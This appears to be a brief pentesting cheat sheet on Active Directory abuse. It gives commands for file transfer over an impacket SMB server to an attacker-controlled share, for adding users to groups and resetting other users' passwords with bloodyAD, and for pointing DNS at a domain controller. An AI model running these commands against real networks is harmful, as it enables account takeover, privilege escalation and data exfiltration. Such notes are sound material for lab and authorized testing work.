[ACL abuse - Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)

## SMB file transfer

On Linux machine :
```
mkdir share
impacket-smbserver share -smb2support share -user guest -password guest
```

On Windows :
```
net use n: \\IP\share /user:fred fred
copy n:\filename .
copy filename n:\
```

Using URL : `smb://IP/share`  
Using UNC path : `//IP/share`


## Add user to group 

```
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

## Change password of user

```
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

## Configuring DNS to see Domain Controller :  
edit /etc/resolv.conf and set `nameserver` to the DC's IP or another IP with 53 port open
